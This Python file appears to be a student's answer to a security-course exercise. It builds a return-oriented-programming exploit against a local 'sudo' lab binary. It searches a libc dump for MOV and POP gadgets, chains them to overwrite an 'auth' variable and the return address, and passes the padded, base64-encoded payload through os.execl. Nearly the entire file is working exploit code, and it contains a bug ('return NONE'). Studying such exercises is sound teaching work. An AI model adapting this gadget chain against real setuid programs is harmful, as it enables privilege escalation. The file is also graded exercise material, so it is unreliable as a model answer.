import os
import sys
import base64

import addresses
from infosec.utils import assemble
from search import GadgetSearch
import re

PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'

def get_gadgets(search: GadgetSearch) -> bytes:
   """
   This function searches the LIBC_DUMP_PATH for commands to create a write gadget.
   """
   mov_gadgets = search.find_all_formats('MOV [{0}], {1}')
   #https://stackoverflow.com/questions/16440267/how-to-find-a-word-that-starts-with-a-specific-character
   for mov_gadget, mov_gadget_addr in mov_gadgets:
      registers = re.findall(r'\b[eE]\w+|\b\[[eE]\w+', mov_gadget) # finds all words that starts with e (or E) or starts with [e
      if len(set(registers)) < 2:
         continue # we need to different registers!
      try:
         first_pop_gadget  = search.find('POP %s'%registers[0])
         second_pop_gadget = search.find('POP %s'%registers[1])
         rop = addresses.address_to_bytes(first_pop_gadget)    + \
               addresses.address_to_bytes(addresses.AUTH)      + \
               addresses.address_to_bytes(second_pop_gadget)   + \
               addresses.address_to_bytes(0x1)                 + \
               addresses.address_to_bytes(mov_gadget_addr)     + \
               addresses.address_to_bytes(addresses.CHK_PASS_RA)
         return rop
      except ValueError as e:
          continue # gadjet not found
   print("error: couldn't find wanted write gadget")
   return NONE

def get_arg() -> bytes:
    """
    This function returns the (pre-encoded) `password` argument to be sent to
    the `sudo` program.

    This data should cause the program to execute our ROP Write Gadget, modify the
    `auth` variable and print `Victory!`. Make sure to return a `bytes` object
    and not an `str` object.

    NOTES:
    1. Use `addresses.AUTH` to get the address of the `auth` variable.
    2. Don't write addresses of gadgets directly - use the search object to
       find the address of the gadget dynamically.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
    """
    search = GadgetSearch(LIBC_DUMP_PATH)
    rop = get_gadgets(search)
    return rop.rjust(addresses.RA - addresses.BUFF_START + len(rop) ,bytes([90]))

def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))


if __name__ == '__main__':
    main(sys.argv)
